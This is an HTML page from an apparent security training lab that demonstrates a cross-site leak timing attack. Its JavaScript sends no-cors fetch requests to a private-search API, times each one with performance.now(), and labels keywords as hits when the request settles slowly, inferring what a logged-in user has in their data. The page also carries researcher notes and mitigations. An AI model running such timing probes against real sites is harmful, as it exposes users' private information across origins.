<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XS-Leaks Timing Attack Lab</title>
    <script src="https://tailwindcss.eitebar.ir/tailwind-play.js"></script>
    <style>
        .terminal-scroll::-webkit-scrollbar {
            width: 8px;
        }
        .terminal-scroll::-webkit-scrollbar-track {
            background: #111827;
        }
        .terminal-scroll::-webkit-scrollbar-thumb {
            background: #374151;
            border-radius: 4px;
        }
    </style>
</head>
<body class="bg-gray-950 text-gray-300 font-sans min-h-screen p-8 selection:bg-indigo-500 selection:text-white">

    <div class="max-w-5xl mx-auto">

        <header class="mb-8 border-b border-gray-800 pb-4">
            <h1 class="text-4xl font-extrabold text-indigo-500">Cross-Site Leaks (XS-Leaks)</h1>
            <p class="text-gray-400 mt-2 text-lg">Inferring private data via cross-origin execution timing.</p>
        </header>

        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">

            <!-- Exploit UI -->
            <div class="lg:col-span-2">
                <div class="bg-black rounded-xl border border-gray-800 shadow-2xl overflow-hidden flex flex-col h-[500px]">
                    <div class="bg-gray-900 px-4 py-3 border-b border-gray-800 flex justify-between items-center">
                        <div class="flex items-center space-x-2">
                            <div class="w-3 h-3 rounded-full bg-red-500"></div>
                            <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
                            <div class="w-3 h-3 rounded-full bg-green-500"></div>
                            <span class="ml-2 text-xs font-mono text-gray-500 uppercase tracking-widest">Timing Analysis Module</span>
                        </div>
                        <button id="start-btn" class="bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-bold py-1.5 px-4 rounded shadow transition-colors">
                            Start Inference Attack
                        </button>
                    </div>

                    <div id="terminal" class="p-5 font-mono text-sm overflow-y-auto terminal-scroll flex-grow">
                        <div class="text-gray-500 mb-4">
                            > Target API: https://webapp.kr-rezvan.ir/api/private-search?q=[WORD]<br>
                            > Note: CORS blocks us from reading the response body.<br>
                            > Technique: Measuring promise settlement time.<br>
                            > Awaiting execution command...
                        </div>
                    </div>
                </div>
            </div>

            <!-- Developer Notes -->
            <div class="bg-indigo-900/10 border border-indigo-900/30 rounded-xl p-6">
                <h3 class="flex items-center text-indigo-400 font-bold text-xl mb-4 border-b border-indigo-800/50 pb-2">
                    <svg class="w-6 h-6 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                    Researcher Notes
                </h3>

                <div class="text-gray-300 space-y-4 text-sm leading-relaxed">
                    <p>
                        <strong class="text-white">The Vulnerability:</strong> Even when CORS prevents a malicious site from reading an API's JSON response, the <em>browser</em> still executes the network request. If the server takes a different amount of time to process a "Hit" versus a "Miss", the attacker can measure that difference using <code>performance.now()</code>.
                    </p>
                    <p>
                        <strong class="text-white">State Inference:</strong> By systematically querying keywords, an attacker can determine if the logged-in user has access to "project_x" or possesses "confidential" documents, purely based on response latency.
                    </p>
                    <div class="bg-indigo-950/50 p-4 rounded-lg border border-indigo-800/50 mt-4">
                        <strong class="text-indigo-300 block mb-2">🛡️ Mitigations:</strong>
                        <ul class="list-disc list-inside space-y-1 text-gray-400">
                            <li><strong>SameSite Cookies:</strong> Enforcing <code>SameSite=Lax</code> or <code>Strict</code> prevents the browser from sending the user's session cookie during the cross-origin request, making the timing attack measure the <em>unauthenticated</em> state.</li>
                            <li><strong>Constant-Time Algorithms:</strong> Ensure database queries and code paths execute in the exact same duration regardless of the outcome (often very difficult in complex apps).</li>
                        </ul>
                    </div>
                </div>
            </div>

        </div>
    </div>

    <!-- Exploit Logic -->
    <script>
        const terminal = document.getElementById('terminal');
        const startBtn = document.getElementById('start-btn');

        // Words we want to check against the victim's private database
        const targetWords = ['guest', 'confidential', 'public', 'project_x', 'random_word', 'admin_rezvan'];
        const THRESHOLD_MS = 400; // If response takes > 400ms, assume the DB did work (HIT)

        function log(msg, type = 'info') {
            const line = document.createElement('div');
            line.className = 'mb-1';

            let color = 'text-gray-400';
            if (type === 'hit') color = 'text-red-400 font-bold bg-red-900/20 px-1 rounded inline-block';
            if (type === 'miss') color = 'text-green-400';
            if (type === 'system') color = 'text-indigo-400';

            line.innerHTML = `> <span class="${color}">${msg}</span>`;
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
        }

        async function measureTime(word) {
            const url = `https://webapp.kr-rezvan.ir/api/private-search?q=${word}`;
            log(`Fetching: ${word}...`, 'system');

            const start = performance.now();
            try {
                // mode: 'no-cors' intentionally creates an opaque response.
                // We don't care about the body, only the time it takes to settle.
                await fetch(url, { mode: 'no-cors', cache: 'no-store' });
            } catch (e) {
                // Network error, but we still measure time
            }
            const end = performance.now();
            return Math.round(end - start);
        }

        startBtn.addEventListener('click', async () => {
            startBtn.disabled = true;
            startBtn.classList.add('opacity-50', 'cursor-not-allowed');
            terminal.innerHTML = ''; // Clear
            log('Initializing XS-Leak Timing Sequence...', 'system');
            log(`Threshold set to: ${THRESHOLD_MS}ms`, 'system');
            log('----------------------------------------', 'system');

            for (const word of targetWords) {
                const duration = await measureTime(word);

                if (duration > THRESHOLD_MS) {
                    log(`[HIT]  "${word}" -> ${duration}ms (Data Exists!)`, 'hit');
                } else {
                    log(`[MISS] "${word}" -> ${duration}ms`, 'miss');
                }

                // Small delay to make the UI look cool
                await new Promise(r => setTimeout(r, 300));
            }

            log('----------------------------------------', 'system');
            log('Timing Sequence Complete.', 'system');
            startBtn.disabled = false;
            startBtn.classList.remove('opacity-50', 'cursor-not-allowed');
        });
    </script>

    <!-- Global Back Button -->
    <a href="http://webapp.kr-rezvan.ir/labs" style="position: fixed; bottom: 20px; right: 20px; background-color: #3b82f6; color: white; padding: 10px 20px; border-radius: 50px; font-family: sans-serif; text-decoration: none; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1); z-index: 9999; transition: all 0.3s;" onmouseover="this.style.backgroundColor='#2563eb'" onmouseout="this.style.backgroundColor='#3b82f6'">
        🏠 Back to Lab Directory
    </a>

</body>
</html>